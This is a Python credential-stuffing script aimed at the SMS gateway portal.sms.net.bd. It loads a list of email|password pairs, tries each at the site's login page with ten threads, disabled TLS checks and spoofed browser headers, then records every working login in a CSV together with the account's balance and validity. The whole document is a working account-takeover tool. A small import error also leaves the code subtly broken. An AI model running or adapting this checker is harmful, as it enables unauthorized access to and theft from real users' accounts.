from requests.api import post
import urllib3
import csv
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
headers_ ={
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'origin': 'https://portal.sms.net.bd',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://portal.sms.net.bd/',
    'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
}
def save_to_csv(data, filename):
    with open(filename, mode='a', newline='') as file:
        writer = csv.writer(file)
        if file.tell() == 0:  # Check if the file is empty to write headers
            writer.writerow(['Email','Password', 'Balance', 'Validity'])
        for item in data:
            writer.writerow([item['email'], item['password'], item['balance'], item['validity']])
def main(email, password):
    headers =headers_.copy()
    session = requests.Session()
    response = session.get('https://portal.sms.net.bd/login/?redirect=/', headers=headers, verify=False)
    cookies = response.cookies.get_dict()
    data = {
    'email': email,
    'password': password,
    }
    response = session.post('https://portal.sms.net.bd/login/', cookies=cookies, headers=headers, data=data, verify=False)
    if "Successfully logged in" in response.text:
        token = response.json().get('data', {}).get('token')
        headers['x-auth-token'] = token
        response = session.get('https://api.sms.net.bd/user/balance/', headers=headers, verify=False)
        balance = response.json().get('data', {}).get('balance')
        print(f"Balance: {balance}")
        validity = response.json().get('data', {}).get('validity')
        print(f"Validity: {validity}")
        save_to_csv([{'email': email, 'password': password, 'balance': balance, 'validity': validity}], 'account_info.csv')


read_file =open("portalsmsnetbd_users.txt", "r", encoding='utf-8').read().splitlines()
with ThreadPoolExecutor(max_workers=10) as executor:
    for line in read_file:
        email, password = line.split('|')
        executor.submit(main, email, password)
